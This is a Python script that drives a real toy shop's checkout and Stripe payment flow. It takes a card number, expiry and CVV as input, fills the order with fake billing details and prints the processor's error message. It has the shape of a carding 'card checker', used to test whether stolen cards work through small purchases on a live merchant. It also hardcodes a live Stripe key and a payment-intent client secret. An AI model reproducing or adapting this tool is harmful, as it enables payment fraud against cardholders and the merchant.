"""

import requests as r


session = r.Session()

card = input("Card: ")
month = input("month: ")
year = input("year: ")
cvv = input("cvv: ")


# ====================== Initial page ===================

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
}

response = session.get(
    'https://www.fatbrainbaby.com/boutique/tomy_corp/lamaze_spin_smile_rattle.cfm',
    headers=headers,
)


# ==================== insert product =================

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.fatbrainbaby.com/',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.fatbrainbaby.com',
    'Connection': 'keep-alive',
}

params = {
    'method': 'cart_insert',
}

data = {
    'RR0229-1': '1',
}

product = session.post(
    'https://www.fatbrainbaby.com/controllers/user_ajax.cfc',
    params=params,
    headers=headers,
    data=data,
)

# ============== req 3 ======================= 
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.fatbrainbaby.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.fatbrainbaby.com',
    'Connection': 'keep-alive',
}

shopper= session.post('https://www.fatbrainbaby.com/cart/shopper.cfm', headers=headers)


# ================== get ship info =================================

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.fatbrainbaby.com/',
    'Connection': 'keep-alive',
}

get_ship = session.get('https://www.fatbrainbaby.com/cart/ship_info.cfm', headers=headers)



# ================= ship method ================

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.fatbrainbaby.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.fatbrainbaby.com',
    'Connection': 'keep-alive',
}

data = {
    'bill_first_name': 'ByDog3r',
    'bill_last_name': 'Production',
    'bill_company': 'Quack.Inc',
    'bill_address_1': '511 King Shoals',
    'bill_address_2': 'Haleighbury',
    'bill_city': 'New York',
    'bill_state': 'NY',
    'bill_zip': '10005',
    'bill_country': 'US',
    'bill_email': 'asdfasdf21@gmail.com',
    'bill_phone': '456548564546',
    's_zip': '',
    'ship_first_name': 'Leonel',
    'ship_last_name': 'M',
    'ship_company': 'Quack.Inc',
    'ship_address_1': '511 King Shoals',
    'ship_address_2': '',
    'ship_city': 'New York',
    'ship_state': 'NY',
    'ship_zip': '10080',
    'ship_country': 'US',
    'ups_location_id': '0',
    'digital_name': '',
    'ship_email': '',
    'add-promo-code': '',
    'est-ship-zip': '',
    'address_ok': '1',
}

response = session.post('https://www.fatbrainbaby.com/cart/ship_methods.cfm', headers=headers, data=data)


# ============================ Capture ship method ==============

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.fatbrainbaby.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.fatbrainbaby.com',
    'Connection': 'keep-alive',
}

data = {
    'ship_method': 'ship_best',
    'add-promo-code': '',
    'est-ship-zip': '',
    'ship_date': '07/26/2023',
    'ship_cost': '7.99',
}

response = session.post('https://www.fatbrainbaby.com/cart/payment_methods.cfm', headers=headers, data=data)


# ===== Capture payment_methods ============

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://js.stripe.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://js.stripe.com',
    'Connection': 'keep-alive',
}

data = f'type=card&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=asdf&billing_details[address][line2]=asdf&billing_details[address][postal_code]=10005&billing_details[address][state]=NY&billing_details[name]=afasdf+asdfakj&billing_details[email]=asdfasdf%40gmail.com&billing_details[phone]=456548564546&card[number]={card}&card[cvc]={cvv}&card[exp_month]={month}&card[exp_year]={year}&guid=552e67d0-440e-420f-93cf-4fb59fd53cd01d45b0&muid=d0ba9266-eaeb-4bc0-b9dd-a161db6ba7a7fe6568&sid=06897369-892a-4836-850c-f9c2adfa1487ee59f2&pasted_fields=number&payment_user_agent=stripe.js%2F71bc7f8b62%3B+stripe-js-v3%2F71bc7f8b62%3B+split-card-element&time_on_page=339466&key=pk_live_nUwh96pkDz7q1xWyt4tDjv8d'

response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)


# =============== Order review ====================

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://www.fatbrainbaby.com/',
    'Connection': 'keep-alive',
}

response = session.get('https://www.fatbrainbaby.com/cart/order_review.cfm', headers=headers)

# ============= checkout ========

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'application/json',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://js.stripe.com/',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://js.stripe.com',
    'Connection': 'keep-alive',
}

data = {
    'payment_method': 'pm_1NVcveJZlbs1SRlNjDtD7alC',
    'expected_payment_method_type': 'card',
    'use_stripe_sdk': 'true',
    'key': 'pk_live_nUwh96pkDz7q1xWyt4tDjv8d',
    'client_secret': 'pi_3NVcvfJZlbs1SRlN1d3kpzD1_secret_6zwkHODzZ4FY3gblFa2RjReyu',
}

response = session.post(
    'https://api.stripe.com/v1/payment_intents/pi_3NVcvfJZlbs1SRlN1d3kpzD1/confirm',
    headers=headers,
    data=data,
)

print(response.json()['error']['message'])

# ================= you can see requests by requests in a page ===========
#with open("pagina.html", "w", encoding="utf-8") as f:
#    f.write(response.text)


"""